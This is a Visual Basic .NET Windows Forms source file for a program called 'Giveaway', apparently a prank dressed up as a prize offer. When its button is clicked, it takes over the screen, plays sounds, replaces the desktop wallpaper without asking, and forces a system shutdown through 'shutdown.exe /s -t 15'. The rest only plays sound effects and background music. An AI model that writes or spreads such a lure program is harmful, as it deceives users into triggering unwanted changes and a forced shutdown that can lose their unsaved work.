Public Class Giveaway
    Dim screenWidth As Integer = Screen.PrimaryScreen.Bounds.Width
    Dim screenHeight As Integer = Screen.PrimaryScreen.Bounds.Height
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
        Label1.Hide()
        Label2.Hide()
        Button1.Hide()
        Button2.Hide()
        PictureBox1.Hide()
        PictureBox2.Hide()
        Panel1.Hide()
        Me.BackgroundImage = My.Resources.tenor
        Application.DoEvents()
        My.Computer.Audio.Play(My.Resources.Shatter, AudioPlayMode.WaitToComplete)
        SystemParametersInfo(20, 0, "C:\Program Files (x86)\Newfiddy Soft\BuyaSwan\Wallpaper.jpg", &H1)
        Process.Start("shutdown.exe", "/s /c Shocking -t 15")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Button1.Hide()
        Application.DoEvents()
        My.Computer.Audio.Play(My.Resources.Erawr, AudioPlayMode.WaitToComplete)
    End Sub

    Private Sub Label1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label1.Click
        My.Computer.Audio.Play(My.Resources.Pain, AudioPlayMode.Background)
    End Sub

    Private Sub Label2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label2.Click
        My.Computer.Audio.Play(My.Resources.Pain, AudioPlayMode.Background)
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        My.Computer.Audio.Play(My.Resources.Pain, AudioPlayMode.Background)
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        My.Computer.Audio.Play(My.Resources.Pain, AudioPlayMode.Background)
    End Sub

    Private Sub Giveaway_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        My.Computer.Audio.Play(My.Resources.musik, AudioPlayMode.BackgroundLoop)
    End Sub
End Class